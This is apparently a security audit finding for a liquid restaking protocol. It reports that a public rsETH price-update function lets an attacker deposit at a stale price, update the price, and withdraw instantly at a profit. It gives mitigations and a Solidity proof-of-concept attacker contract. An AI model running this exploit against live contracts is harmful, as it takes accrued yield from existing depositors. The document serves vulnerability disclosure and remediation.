### Title
Stale `rsETHPrice` Sandwich Attack via Public `updateRSETHPrice()` — (`File: contracts/LRTOracle.sol`)

---

### Summary

`LRTOracle.updateRSETHPrice()` is publicly callable and writes a discrete jump to the cached `rsETHPrice` storage variable. Because deposits (`LRTDepositPool`) and instant withdrawals (`LRTWithdrawalManager`) both read this same cached value, an unprivileged attacker can atomically: deposit at the stale (lower) price, trigger the price update, and instantly withdraw at the new (higher) price — extracting accumulated staking yield that belongs to existing rsETH holders.

---

### Finding Description

`LRTOracle` stores a cached exchange rate in the state variable `rsETHPrice`. [1](#0-0) 

This value is only refreshed when `updateRSETHPrice()` is explicitly called: [2](#0-1) 

The function is `public` with no access restriction. Between calls, staking rewards accumulate inside EigenLayer strategies, so the actual TVL grows while `rsETHPrice` remains frozen at its last-written value.

**Deposit minting** divides by the cached price: [3](#0-2) 

A stale (lower) `rsETHPrice` causes the depositor to receive *more* rsETH than their fair share.

**Instant withdrawal** multiplies by the cached price: [4](#0-3) 

After `updateRSETHPrice()` raises the price, the same rsETH balance redeems for *more* underlying assets.

The three steps can be composed inside a single attacker-controlled contract call:

1. Call `LRTDepositPool.depositETH{value: X}(0, "")` — receive `X / P_old` rsETH at the stale price `P_old`.
2. Call `LRTOracle.updateRSETHPrice()` — price jumps to `P_new > P_old` reflecting accumulated rewards.
3. Call `LRTWithdrawalManager.instantWithdrawal(ETH, X/P_old, "")` — redeem `(X/P_old) * P_new` ETH.

**Gross profit** = `X * (P_new/P_old − 1)`, minus the `instantWithdrawalFee`. The loss is borne by all existing rsETH holders whose proportional claim on the TVL is diluted.

The `pricePercentageLimit` guard in `_updateRsETHPrice` reverts non-manager callers only when the price increase exceeds the configured threshold: [5](#0-4) 

This is a partial mitigation only: (a) if `pricePercentageLimit == 0` the check is skipped entirely; (b) even when set, the attacker profits from any price increase that stays within the limit, and can repeat the attack every accumulation cycle.

---

### Impact Explanation

**High — Theft of unclaimed yield.**

Each execution drains the yield that has accumulated since the last price update from all existing rsETH holders. With a large enough deposit the attacker can capture the entire pending reward increment in a single atomic transaction. Losses scale with TVL and the length of the staleness window.

---

### Likelihood Explanation

`updateRSETHPrice()` is permissionless and the price is always stale between keeper calls. The only operational prerequisite is that `isInstantWithdrawalEnabled[asset]` is `true` for at least one supported asset and that the `LRTUnstakingVault` holds sufficient liquidity for instant redemption. Both conditions are expected to hold during normal protocol operation. The attack requires no privileged access, no oracle manipulation, and no external protocol compromise. [6](#0-5) 

---

### Recommendation

1. **Remove the public price-update entry point from the deposit/withdrawal hot path.** Restrict `updateRSETHPrice()` to `onlyLRTManager` (or a trusted keeper), so an attacker cannot atomically trigger the price jump themselves.
2. **Alternatively, apply a per-block or per-transaction deposit-then-withdraw lock.** Record the block number at deposit and reject instant withdrawals in the same block for the same address.
3. **Enforce a non-zero `pricePercentageLimit` as a mandatory invariant** so that even if the public function remains, a single call cannot move the price by an economically meaningful amount.
4. **Consider a TWAP or time-weighted price** for minting and redemption rather than a point-in-time snapshot, eliminating the discrete jump that makes sandwiching profitable.

---

### Proof of Concept

```solidity
// Attacker contract — executes the full sandwich in one transaction
contract SandwichAttack {
    ILRTDepositPool  depositPool;
    ILRTOracle       oracle;
    ILRTWithdrawalManager withdrawalMgr;
    IRSETH           rsETH;

    function attack() external payable {
        uint256 depositAmount = msg.value;

        // Step 1: deposit at stale (lower) rsETHPrice → receive inflated rsETH
        depositPool.depositETH{value: depositAmount}(0, "");

        // Step 2: trigger the discrete price jump (permissionless)
        oracle.updateRSETHPrice();

        // Step 3: instant-withdraw at the new (higher) rsETHPrice
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalMgr), rsETHBalance);
        withdrawalMgr.instantWithdrawal(LRTConstants.ETH_TOKEN, rsETHBalance, "");

        // Profit = received ETH − depositAmount − instantWithdrawalFee
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

**Preconditions:** `isInstantWithdrawalEnabled[ETH_TOKEN] == true`; `LRTUnstakingVault` holds ≥ redeemed ETH; `pricePercentageLimit == 0` or accumulated rewards are within the limit.

**Affected lines:**
- `LRTOracle.updateRSETHPrice()` — [2](#0-1) 
- `LRTDepositPool.getRsETHAmountToMint()` — [3](#0-2) 
- `LRTWithdrawalManager.getExpectedAssetAmount()` — [4](#0-3) 
- `LRTWithdrawalManager.instantWithdrawal()` — [7](#0-6)

### Citations

**File:** contracts/LRTOracle.sol (L28-28)
```text
    uint256 public override rsETHPrice;
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L252-266)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L78-81)
```text
    modifier onlyInstantWithdrawalAllowed(address asset) {
        if (!isInstantWithdrawalEnabled[asset]) revert InstantWithdrawalNotEnabled();
        _;
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L212-253)
```text
    function instantWithdrawal(
        address asset,
        uint256 rsETHUnstaked,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlySupportedAsset(asset)
        onlySupportedStrategy(asset)
        onlyInstantWithdrawalAllowed(asset)
    {
        if (rsETHUnstaked == 0 || rsETHUnstaked < minRsEthAmountToWithdraw[asset]) {
            revert InvalidAmountToWithdraw();
        }
        if (IERC20(lrtConfig.rsETH()).balanceOf(msg.sender) < rsETHUnstaked) revert NotEnoughRsETH();
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
        ILRTUnstakingVault unstakingVault = ILRTUnstakingVault(lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT));
        if (assetAmountUnlocked > unstakingVault.getAssetsAvailableForInstantWithdrawal(asset)) {
            revert CantInstantWithdrawMoreThanAvailable();
        }

        unstakingVault.redeem(asset, assetAmountUnlocked);

        uint256 fee = (assetAmountUnlocked * instantWithdrawalFee) / 10_000;
        uint256 userAmount = assetAmountUnlocked - fee;

        address feeRecipient = instantWithdrawalFeeRecipient;
        if (feeRecipient == address(0)) {
            // Backwards-compatible default: send fees to the protocol treasury
            feeRecipient = lrtConfig.getContract(LRTConstants.PROTOCOL_TREASURY);
        }
        if (fee > 0) {
            _transferAsset(asset, feeRecipient, fee);
            emit InstantWithdrawalFeeCollected(msg.sender, asset, fee);
        }

        _transferAsset(asset, msg.sender, userAmount);
        emit ReferralIdEmitted(referralId);
        emit AssetWithdrawalFinalized(msg.sender, asset, rsETHUnstaked, userAmount);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L592-594)
```text
        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```
